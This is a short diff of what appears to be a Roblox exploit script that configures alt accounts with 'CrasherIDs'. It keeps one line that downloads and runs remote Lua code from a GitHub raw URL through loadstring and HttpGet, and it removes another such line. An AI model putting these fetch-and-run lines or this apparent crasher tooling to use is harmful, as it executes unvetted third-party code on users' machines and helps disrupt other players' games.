@@ -19,7 +19,6 @@ getgenv().Alts = {
     CrasherIDs = { 2208502098 }
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/io5s/io5s/main/domestic_shot-haired_cat.lua"))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/koeqh/Fps-Booster/main/Fps%20Booster'))()
 
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
